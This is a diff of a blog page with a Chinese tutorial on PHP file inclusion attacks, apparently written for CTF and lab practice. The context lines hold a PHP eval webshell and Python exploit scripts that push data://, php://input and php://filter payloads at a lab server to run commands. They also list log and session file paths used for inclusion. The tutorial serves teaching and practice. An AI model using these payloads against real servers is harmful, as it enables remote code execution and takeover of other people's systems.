@@ -22,13 +22,13 @@
     <meta name="description" content="这是一片有关文件包含漏洞手法总结的文章，里面讲了php里面与文件相关的函数以及伪协议，还有各种漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件包含漏洞手法总结">
-<meta property="og:url" content="https://exploreio.github.io/2026/04/10/file_include/index.html">
+<meta property="og:url" content="https://exploreio.github.io/2026/04/13/file_include/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="这是一片有关文件包含漏洞手法总结的文章，里面讲了php里面与文件相关的函数以及伪协议，还有各种漏洞">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://exploreio.github.io/img/eee.png">
-<meta property="article:published_time" content="2026-04-10T12:30:00.000Z">
-<meta property="article:modified_time" content="2026-04-13T03:50:17.786Z">
+<meta property="article:published_time" content="2026-04-13T14:30:00.000Z">
+<meta property="article:modified_time" content="2026-04-13T14:30:17.474Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="手法">
@@ -326,8 +326,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-04-10 20:30" pubdate>
-          2026年4月10日 晚上
+        <time datetime="2026-04-13 22:30" pubdate>
+          2026年4月13日 晚上
         </time>
       </span>
     
@@ -338,7 +338,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          68k 字
+          72k 字
         
       </span>
     
@@ -349,7 +349,7 @@
         
         
         
-          113 分钟
+          120 分钟
         
       </span>
     
@@ -469,7 +469,7 @@
     
       
       
-        <a href="/2026/04/10/file_include/" title="文件包含漏洞手法总结"
+        <a href="/2026/04/13/file_include/" title="文件包含漏洞手法总结"
            class="list-group-item list-group-item-action
            active">
           <span class="category-post">文件包含漏洞手法总结</span>
@@ -503,8 +503,8 @@
             
               <div class="markdown-body">
                 
-                <h2 id="文件包含漏洞手法总结"><a href="#文件包含漏洞手法总结" class="headerlink" title="文件包含漏洞手法总结"></a>文件包含漏洞手法总结</h2><p>废话不多说直接开始讲</p>
-<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>这个是文件包含基础，在函数这个板块我们了解的主要是文件包含相关的函数</p>
+                <p>废话不多说直接开始讲</p>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>这个是文件包含基础，在函数这个板块我们了解的主要是文件包含相关的函数</p>
 <p>主要有两大类：文件包含函数（四小只），文件系统函数</p>
 <p>在这里先了解一下四小只文件包含函数</p>
 <p>文件包含函数有四小只是哪四小只呢？</p>
@@ -512,7 +512,7 @@
 
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP文件包含函数有以下四种：<br><br>include<br>inclued_once<br>require<br>require_once<br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span>/<span class="hljs-built_in">require_once</span>()：如果在包含过程中有错，那么直接退出，不执行进一步操作。<br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span>/<span class="hljs-built_in">include_once</span>(): 如果在包含过程中出错，只会发出警告<br><br>加上后缀_once的作用：如果文件已经包含过了，那么不会再次包含<br><br>当利用这四大漏洞函数包含文件的时候，不论什么类型的文件，都会作为PHP脚本解析（注意这句话的意思，这个的意思是文件里面的内容需要使用php的标签包裹住）<br></code></pre></td></tr></table></figure>
 
-<h4 id="include"><a href="#include" class="headerlink" title="include"></a>include</h4><p>在这里我们介绍其中的第一个include函数</p>
+<h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>在这里我们介绍其中的第一个include函数</p>
 <p>这里我们可以做一个实验</p>
 <p>1.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -533,7 +533,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;phpinfo.txt&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../img/file_include/image-20260408185222367.png" srcset="/img/loading.gif" lazyload alt="image-20260408185222367"></p>
-<h4 id="require"><a href="#require" class="headerlink" title="require"></a>require</h4><p>1.php</p>
+<h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>1.php</p>
 <p>还是使用上面那个文件</p>
 <p>index.php</p>
 <p>文件修改为</p>
@@ -547,23 +547,23 @@
 
 <p><img src="/../img/file_include/image-20260408185529953.png" srcset="/img/loading.gif" lazyload alt="image-20260408185529953"></p>
 <p>执行不了</p>
-<h4 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h4><p>用法还是那个用法</p>
+<h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h3><p>用法还是那个用法</p>
 <p>这里试一试他的特性，遇到包含过的函数是不会再一次包含的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;1.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../img/file_include/image-20260408185843708.png" srcset="/img/loading.gif" lazyload alt="image-20260408185843708"></p>
 <p>可以注意到这个还是可以使用的，这个时候我们可以知道，这个只是不会使用两个1.php</p>
 <p>但是遇到包含两次是不会报错的</p>
-<h4 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h4><p>使用方法都是一样的</p>
+<h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>使用方法都是一样的</p>
 <p>在这里就跳过了</p>
-<h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h4><p>index.php</p>
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;1.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>这个函数是可以将文件内容赋值给变量</p>
 <p>这样就可以输出文件内容了</p>
 <p><img src="/../img/file_include/image-20260408190657728.png" srcset="/img/loading.gif" lazyload alt="image-20260408190657728"></p>
 <p>注意，当我们包含的文件是php代码的时候，需要查看文件源代码才能看到</p>
-<h4 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h4><p>index.php</p>
+<h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h3><p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>传入参数</p>
@@ -571,20 +571,20 @@
 
 <p><img src="/../img/file_include/image-20260408191832548.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以发现输出的是写入内容的数字</p>
-<h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h4><p>index.php</p>
+<h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a>readfile</h3><p>index.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>这个函数是可以读取文件内容的函数，返回的内容是文件的字符数量</p>
 <p><img src="/../img/file_include/image-20260408192412157.png" srcset="/img/loading.gif" lazyload alt="image-20260408192412157"></p>
 <p>注意当文件内容是php代码的时候，我们得使用查看源代码才能看到</p>
-<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>在细致的讲php伪协议之前我们先大致的了解一下</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>在细致的讲php伪协议之前我们先大致的了解一下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">// — 访问本地文件系统</span><br>http:<span class="hljs-comment">// — 访问 HTTP(s) 网址</span><br>ftp:<span class="hljs-comment">// — 访问 FTP(s) URLs</span><br>php:<span class="hljs-comment">// — 访问各个输入/输出流（I/O streams）</span><br>zlib:<span class="hljs-comment">// — 压缩流</span><br>data:<span class="hljs-comment">// — 数据（RFC 2397）</span><br>glob:<span class="hljs-comment">// — 查找匹配的文件路径模式</span><br>phar:<span class="hljs-comment">// — PHP 归档</span><br>ssh2:<span class="hljs-comment">// — Secure Shell 2</span><br>rar:<span class="hljs-comment">// — RAR</span><br>ogg:<span class="hljs-comment">// — 音频流</span><br>expect:<span class="hljs-comment">// — 处理交互式的流</span><br></code></pre></td></tr></table></figure>
 
 <p>上面这些是php所支持的伪协议</p>
 <p>下面有一个图片可以形象的说明了伪协议的利用以及利用条件</p>
 <p><img src="/../img/file_include/123sdfj.png" srcset="/img/loading.gif" lazyload alt="123sdfj"></p>
 <p>接下来就开始讲各个伪协议的使用方法</p>
-<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>基本的使用方法</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>基本的使用方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>注意使用这个一定要绝对路径</p>
@@ -594,7 +594,7 @@
 <p>但是如果我们使用相对路径是使用不了的</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url  = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php/&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;file://./1.txt&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
 
-<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><p>data伪协议是将我所执行的内容当做文件内容传给include等包含函数</p>
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>data伪协议是将我所执行的内容当做文件内容传给include等包含函数</p>
 <p>这个伪协议是可以直接执行php代码的</p>
 <p>在实验之前我们需要配置一下php.ini文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen = On<br>allow_url_include = On<br></code></pre></td></tr></table></figure>
@@ -608,7 +608,7 @@
 
 <p>这个例子就很好的知道了我们是可以控制文件内容了</p>
 <p>data:&#x2F;&#x2F;伪协议有两种格式，一种是明文一种是base64</p>
-<h5 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain,"></a>data:&#x2F;&#x2F;text&#x2F;plain,</h5><p>基本结构</p>
+<h4 id="data-明文"><a href="#data-明文" class="headerlink" title="data:&#x2F;&#x2F;明文"></a>data:&#x2F;&#x2F;明文</h4><p>基本结构</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,PHP代码</span><br></code></pre></td></tr></table></figure>
 
 <p>关键注意：<br>text&#x2F;plain：表示传递的是 “纯文本数据”；<br>PHP 代码中的特殊字符（如空格、&amp;、&#x3D;）必须 URL 编码（比如空格编码成%20）；</p>
@@ -627,7 +627,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain,%3C%3Fphp%20%40eval%28%24_POST%5B%22cmd%22%5D%29%3B%20%3F%3E&#x27;</span>&#125;<br>r = requests.get(url, params=data)<br>url_exp = r.url<br>payload = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;<br>x = requests.post(url_exp, data=payload)<br><span class="hljs-built_in">print</span>(x.text)<br></code></pre></td></tr></table></figure>
 
 <p>接下来就是介绍另外一种方式实现data伪协议</p>
-<h5 id="data-text-plain-base64"><a href="#data-text-plain-base64" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain;base64,"></a>data:&#x2F;&#x2F;text&#x2F;plain;base64,</h5><p>可以发现这个就是比普通的plain多了一个;base64</p>
+<h4 id="data-base64"><a href="#data-base64" class="headerlink" title="data:&#x2F;&#x2F;base64"></a>data:&#x2F;&#x2F;base64</h4><p>可以发现这个就是比普通的plain多了一个;base64</p>
 <p>基本的使用方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,base64编码之后的php代码</span><br></code></pre></td></tr></table></figure>
 
@@ -657,7 +657,7 @@
 <p>于是又了exp如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>php = <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;monica&quot;]);?&gt;aa&#x27;</span><br>php_base64 = base64.b64encode(php.encode()).decode()<br><span class="hljs-built_in">print</span>(php_base64)<br>data = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;data://text/plain;base64,&#x27;</span>+php_base64&#125;<br>r = requests.get(url, params=data)<br>x = r.url<br>payload = &#123;<span class="hljs-string">&#x27;monica&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.post(x, data=payload).text)<br></code></pre></td></tr></table></figure>
 
-<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>现在我们开始来到了另外的一个伪协议php:&#x2F;&#x2F;input</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>现在我们开始来到了另外的一个伪协议php:&#x2F;&#x2F;input</p>
 <p>php:&#x2F;&#x2F;input 是 PHP 的内置伪协议（不是真实文件），它的核心作用是：读取 POST 请求的原始数据（不经过 PHP 解析）</p>
 <p>使用可以把POST 请求发过来的原始数据直接读取到</p>
 <blockquote>
@@ -696,7 +696,7 @@
 <p><img src="/../img/file_include/1771605355009-36dac773-5055-4e29-a660-cd50987dceeb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>所以我们还是使用python或者是curl命令或者使用burp</p>
 <p><img src="/../img/file_include/1771605355069-e91cc7f7-725d-47b1-ac11-20e5295636fc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><h5 id="大概的介绍"><a href="#大概的介绍" class="headerlink" title="大概的介绍"></a>大概的介绍</h5><p>现在来到最后一个经常使用的伪协议php:&#x2F;&#x2F;filter</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><h4 id="大概的介绍"><a href="#大概的介绍" class="headerlink" title="大概的介绍"></a>大概的介绍</h4><p>现在来到最后一个经常使用的伪协议php:&#x2F;&#x2F;filter</p>
 <p>这个伪协议十分的重要，主要的功能是可以转换编码等各种操作</p>
 <p>使用方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/过滤器名称/resource=要处理的文件</span><br>php:<span class="hljs-comment">//filter/read=过滤器名称/resource=要处理的文件</span><br>php:<span class="hljs-comment">//filter/write=过滤器名称/resource=要处理的文件</span><br></code></pre></td></tr></table></figure>
@@ -735,7 +735,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=zlib.deflate/resource=test.txt</span><br>php:<span class="hljs-comment">//filter/read=zlib.inflate/resource=test.txt.gz</span><br></code></pre></td></tr></table></figure>
 
 <p>刚刚我们大致的已经了解了这些过滤器长什么样子，现在开始细致的讲这些过滤器的使用方法</p>
-<h5 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h5><p>服务端1.php</p>
+<h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a>string.rot13</h4><p>服务端1.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>使用python攻击</p>
@@ -783,7 +783,7 @@
 <p>使用这个python代码是可以执行的</p>
 <p>这个时候就是使用rot13的write方法</p>
 <p>这个的灵感来自于php:&#x2F;&#x2F;filter 的死亡绕过，但是使用rot13是绕过不了死亡函数的原因还是上面的那个原因，rot13编码改变不了&lt;&gt;符号</p>
-<h5 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h5><p>来到了base64了</p>
+<h4 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h4><p>来到了base64了</p>
 <p>基本的使用方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=文件</span><br></code></pre></td></tr></table></figure>
 
@@ -823,7 +823,7 @@
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.8.140:8899</span>/include/<span class="hljs-number">1</span>.php?file=php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.base64-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>Dphp%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Finput<br><span class="hljs-attribute">PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTs</span>/Pg==<br><span class="hljs-section">&lt;?php system(<span class="hljs-string">&quot;whoami&quot;</span>);?&gt;</span><span class="hljs-section">&lt;br&gt;</span><span class="hljs-attribute">win</span>-jkgn2kfimmk\administrator<br></code></pre></td></tr></table></figure>
 
 <p>只有include执行的任意命令，readfile则没有</p>
-<h5 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h5><p>这种编码的规则如下</p>
+<h4 id="convert-quoted"><a href="#convert-quoted" class="headerlink" title="convert.quoted"></a>convert.quoted</h4><p>这种编码的规则如下</p>
 <figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">ASCII</span> 字符保持不变<br>非 <span class="hljs-keyword">ASCII</span> 字符和特殊字符编码为 =XX<br></code></pre></td></tr></table></figure>
 
 <p>实验一下</p>
@@ -860,7 +860,7 @@
 
 <p>至此convert.quoted就告一段落了</p>
 <p>接下来还是一个重点（好像这个里面全是重点）</p>
-<h5 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv"></a>convert.iconv</h5><p>现在来到了convert.iconv.转化器的殿堂</p>
+<h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv"></a>convert.iconv</h4><p>现在来到了convert.iconv.转化器的殿堂</p>
 <p>这种转化器叫做字符编码转化器</p>
 <p>这个是重中之重</p>
 <p>基本使用方法</p>
@@ -915,7 +915,7 @@
 <p>使用这个代码即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.8.140:8899/include/1.php&#x27;</span><br>r = requests.post(url,params=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&#x27;</span>&#125;,data=&#123;<span class="hljs-string">&#x27;data&#x27;</span>:<span class="hljs-string">&#x27;?&lt;hp pvela$(P_SO[T]1;)&gt;?&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-built_in">print</span>(requests.post(<span class="hljs-string">&#x27;http://192.168.8.140:8899/include/shell.php&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;1&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>&#125;).text)<br></code></pre></td></tr></table></figure>
 
-<h5 id="过滤器嵌套"><a href="#过滤器嵌套" class="headerlink" title="过滤器嵌套"></a>过滤器嵌套</h5><p>什么是过滤器嵌套</p>
+<h4 id="过滤器嵌套"><a href="#过滤器嵌套" class="headerlink" title="过滤器嵌套"></a>过滤器嵌套</h4><p>什么是过滤器嵌套</p>
 <p>还是filter，但是使用了两种过滤器</p>
 <p>像这种</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shelll.php</span><br></code></pre></td></tr></table></figure>
@@ -936,7 +936,8 @@
 
 <p>至此php伪协议就结束了</p>
 <p>接下来就是将一些特定的漏洞场景</p>
-<h3 id="Nginx与apache与ssh日志文件包含"><a href="#Nginx与apache与ssh日志文件包含" class="headerlink" title="Nginx与apache与ssh日志文件包含"></a>Nginx与apache与ssh日志文件包含</h3><p>这三者是差不多的，只需要知道他们各个的日志文件路径即可包含利用</p>
+<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><p>这里主要讲的是这三个的日志文件包含Nginx与apache与ssh</p>
+<p>这三者是差不多的，只需要知道他们各个的日志文件路径即可包含利用</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nginx默认日志路径<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br><br>apache默认日志路径<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/apache2/access.<span class="hljs-built_in">log</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/httpd/access_log<br><br>ssh默认日志路径<br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
 
 <p>可以使用这个靶场phpinclude_lab:level_13和14</p>
@@ -958,7 +959,7 @@
 <p>然后包含就可以了</p>
 <p><img src="/../img/file_include/image-20260412191258407.png" srcset="/img/loading.gif" lazyload alt="image-20260412191258407"></p>
 <p>执行效果如下</p>
-<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>日志结束之后就是session了</p>
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>日志结束之后就是session了</p>
 <p>在linux里面session的默认路径如下</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/sessions/</span>sess_&#123;PHPSESSID&#125;<br>  ○ CentOS：<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>session；<br>  ○ Ubuntu：<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sessions<br></code></pre></td></tr></table></figure>
 
@@ -989,7 +990,7 @@
 <p>注意使用这个脚本的时候要修改里面的路径，变量名啥的，根据自己的实际情况哦（终于写好了，有些文章里面的脚本是执行不了的，大概率是线程不够的原因，我稍加修改得到此脚本）</p>
 </blockquote>
 <p>如果还是不行的话，就猛猛加线程</p>
-<h3 id="THE-END-OF-LFI"><a href="#THE-END-OF-LFI" class="headerlink" title="THE_END_OF_LFI"></a>THE_END_OF_LFI</h3><p>session文件包含结束！接下迎来的是THE_END_OF_LFI</p>
+<h2 id="THE-END-OF-LFI"><a href="#THE-END-OF-LFI" class="headerlink" title="THE_END_OF_LFI"></a>THE_END_OF_LFI</h2><p>session文件包含结束！接下迎来的是THE_END_OF_LFI</p>
 <p>何为THE_END_OF_LFI</p>
